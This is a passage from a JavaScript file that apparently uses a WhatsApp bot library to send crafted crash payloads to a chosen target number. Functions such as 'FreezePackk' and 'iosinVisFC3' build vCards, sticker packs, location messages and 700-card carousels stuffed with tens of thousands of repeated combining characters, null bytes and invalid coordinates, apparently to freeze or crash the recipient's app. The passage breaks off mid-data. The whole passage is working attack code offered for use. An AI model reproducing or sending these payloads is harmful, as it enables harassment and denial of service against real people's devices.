                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
                    contextInfo: {
                        participant: target,
                        externalAdReply: {
                            automatedGreetingMessageShown: true,
                            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                            greetingMessageBody: "\u0000"
                        }
                    }
                }
            },
            {}
        );

        await otax.relayMessage(
            "status@broadcast",
            msg.message,
            {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined
                                    }
                                ]
                            }
                        ]
                    }
                ]
            }
        );
        await sleep(2000);
    }
}
async function ofmcrlManta(otax, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
        fileLength: 162903,
        height: 1080,
        width: 1080,
        mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
        fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
        directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
        mediaKeyTimestamp: 1775033718,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA"
        },
        scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
        scanLengths: [
            10365,
            39303,
            40429,
            72806
        ],
        midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    }

    let cards = [];
    for (let z = 0; z < 700; z++) {
        cards.push({
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: "\0"
            }
        })
    }
    let msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "\0" },
                    carouselMessage: {
                        cards
                    }
                }
            }
        }
    }, {});
    await otax.relayMessage(target, msg.message, {
        participant: { jid: target }
    });
}
async function ofmcrlMantaGb(otax, target) {
    const imageMessage = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
        fileLength: 162903,
        height: 1080,
        width: 1080,
        mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
        fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
        directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
        mediaKeyTimestamp: 1775033718,
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
        contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA"
        },
        scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
        scanLengths: [
            10365,
            39303,
            40429,
            72806
        ],
        midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    }

    let cards = [];
    for (let z = 0; z < 700; z++) {
        cards.push({
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            nativeFlowMessage: {
                messageParamsJson: "\0"
            }
        })
    }
    let msg = generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "\0" },
                    carouselMessage: {
                        cards
                    }
                }
            }
        }
    }, {});
    await otax.relayMessage(target, msg.message, {
    });
}
async function FreezePackk(tdx, target) {
    await tdx.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(70000),
            publisher: "[otax]" + "ꦾ".repeat(500),
            stickers: [],
            fileLength: "3662919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135550202@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "3680054",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});
}
async function iosinVisFC3(otax, target) {
    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
    try {
        let locationMessagex = {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 922.9999999999999,
            name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/otax",
        }
        let msgx = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessagex
                }
            }
        }, {});
        let extendMsgx = {
            extendedTextMessage: {
                text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
                matchedText: "otax",
                description: "𑇂𑆵𑆴𑆿".repeat(60000),
                title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
                previewType: "NONE",
                jpegThumbnail: "",
                thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
                thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
                thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
                mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
                mediaKeyTimestamp: "1743101489",
                thumbnailHeight: 641,
                thumbnailWidth: 640,
                inviteLinkGroupTypeV2: "DEFAULT"
            }
        }
        let msgx2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    extendMsgx
                }
            }
        }, {});
        let locationMessage = {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 922.9999999999999,
            jpegThumbnail: null,
            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
        }
        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    locationMessage
                }
            }
        }, {});
        let extendMsg = {
            extendedTextMessage: {
                text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone,
                matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
                description: "𑇂𑆵𑆴𑆿".repeat(25000),
                title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
                previewType: "NONE",
                jpegThumbnail: "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